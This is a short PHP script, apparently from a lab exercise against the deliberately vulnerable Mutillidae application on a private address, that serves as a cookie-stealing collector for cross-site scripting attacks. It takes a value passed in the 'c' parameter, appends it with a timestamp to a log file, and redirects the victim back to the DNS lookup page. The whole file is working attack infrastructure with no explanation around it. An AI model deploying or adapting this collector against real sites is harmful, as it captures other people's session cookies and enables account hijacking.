<?php
$logFile = "log.txt";
if (!file_exists($logFile)) touch($logFile);

$cookie = $_REQUEST["c"];
$date =date('Y-m-d H:i:s'); 
$handle= fopen($logFile, "a+");
fwrite($handle, $date . " --> ");
fwrite($handle, $cookie . "\n\n");
fclose($handle);
header("Location: http://192.168.56.103/mutillidae/index.php?page=dns-lookup.php");
exit;
